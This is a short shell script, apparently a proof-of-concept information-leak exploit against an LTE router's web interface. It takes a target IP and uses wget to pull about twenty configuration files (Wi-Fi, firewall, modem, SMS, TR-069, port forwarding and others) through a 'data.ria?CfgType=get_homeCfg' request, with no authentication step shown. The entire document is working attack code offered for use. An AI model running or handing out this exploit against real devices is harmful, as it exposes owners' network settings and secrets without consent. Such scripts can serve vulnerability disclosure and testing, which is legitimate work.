#!/bin/sh

ip=$1
if [ ! $1 ]; then
  echo "$0 ip"
  exit 1
fi

echo "INFOLEAK"
echo "press [enter]"
read wut
for i in system apn firewall fota lan modem portfwd r_sku samba sms10 wan_lte wan_wifi wifi cm netstat ipfilter ddns dlna tr069 ip6filter wizard ; do
  wget -qO- "http://$ip/data.ria?CfgType=get_homeCfg&file=$i"
done
